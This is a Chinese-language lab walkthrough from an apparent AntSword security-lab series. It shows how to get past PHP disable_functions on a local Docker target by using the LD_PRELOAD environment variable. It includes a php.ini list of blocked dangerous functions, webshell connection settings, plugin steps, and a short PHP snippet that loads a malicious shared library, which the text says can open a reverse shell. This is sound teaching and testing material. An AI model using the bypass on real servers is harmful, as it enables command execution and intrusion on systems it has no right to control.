## 01 利用 LD_PRELOAD 环境变量

### php.ini 配置如下:

```ini
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system
```

### 使用条件

* Linux 操作系统
* `putenv`
* `mail` or `error_log` 本例中禁用了 `mail` 但未禁用 `error_log`
* 存在可写的目录, 需要上传 `.so` 文件

###  绕过实验

1. 启动环境

```
$ docker-compose up -d
```

Shell | 密码
:-:|:-:|:-:
`http://127.0.0.1:18080/index.php` | ant
`http://127.0.0.1:18080/shell.php` | ant

2. 打开 AntSword 添加 Shell

![1.png](https://i.loli.net/2019/07/08/5d2224b0aa7ad32603.png)

也可直接使用配置导入插件导入下面的配置:

```
{"_id":"YoW1ftyOv7JjrLmN","addr":"IANA 保留地址用于本地回送","category":"default","ctime":1562515402313,"decoder":"default","encode":"UTF8","encoder":"base64","httpConf":{"body":{},"headers":{}},"ip":"127.0.0.1","note":"AntSword-Labs Bypass disable functions","otherConf":{"chunk-step-byte-max":"3","chunk-step-byte-min":"2","command-path":"","filemanager-cache":1,"ignore-https":1,"request-timeout":"30000","terminal-cache":0,"upload-fragment":"500","use-chunk":0,"use-multipart":0},"pwd":"ant","type":"php","url":"http://127.0.0.1:18080/index.php","utime":1562517866376}
```

3. 尝试使用虚拟终端执行命令, 无果

![2.png](https://i.loli.net/2019/07/08/5d2224b31884b21027.png)

4. 使用「绕过 disable_functions」插件, 选择 `LD_PRELOAD` 模式进行

![3.png](https://i.loli.net/2019/07/08/5d2224b4ecaf383830.png)

详细使用方法请点 [这里](https://mp.weixin.qq.com/s/GGnumPklkUNMLZKQL4NbKg)

成功后可以看到 `/var/www/html/` 目录下新建了一个 `.antproxy.php` 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 `.antproxy.php`, 就可以成功执行命令。

![4.png](https://i.loli.net/2019/07/08/5d2224b7e1e2696154.png)

**注意**

从上图可看出来，我们利用 LD_PRELOAD, 在目标机器的 lo 上用 PHP 启动了一个 http server, 并且加载的是 PHP 默认配置。

所以我们需要在插件中填写正确的 php 可执行文件的路径(如果在环境变量中, 可以直接写 `php`)

#### 手动

原理脚本如下:

```
<?php
  putenv("LD_PRELOAD=/tmp/hack.so");
  error_log("a",1);
  mail("a@localhost","","","","");
?>
```

利用 LD_PRELOAD 环境变量, 加载 hack.so, 在 hack.so 中执行命令.

我们可以直接利用 hack.so 反弹 shell, 或者将输出重定向到文件当中
